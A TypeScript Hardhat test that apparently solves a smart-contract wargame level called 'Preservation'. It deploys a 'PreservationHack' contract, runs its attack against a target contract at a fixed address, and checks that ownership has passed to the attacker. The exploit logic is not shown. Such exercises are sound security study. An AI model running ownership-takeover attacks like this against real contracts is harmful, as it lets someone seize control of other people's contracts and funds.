import { expect } from 'chai';
import { ethers } from 'hardhat';
import { Wallet } from 'ethers';

describe('Preservation', function () {
  let owner: Wallet;
  // let user: Wallet;
  it('attack', async function () {
    [owner] = await (ethers as any).getSigners();
    const preservationAddr = '0xB42A310EE49036f7c685DC914aB23C1Cb937A94A';
    const preservation = await ethers.getContractAt('Preservation', preservationAddr);

    // Deploy hack contract
    const PreservationHack = await ethers.getContractFactory('PreservationHack');
    const hack = await PreservationHack.deploy();
    await hack.connect(owner).deployed();

    // Execute attack()
    await hack.connect(owner).attack(preservation.address);
    expect(await preservation.owner()).to.be.eq(owner.address);
  });
});
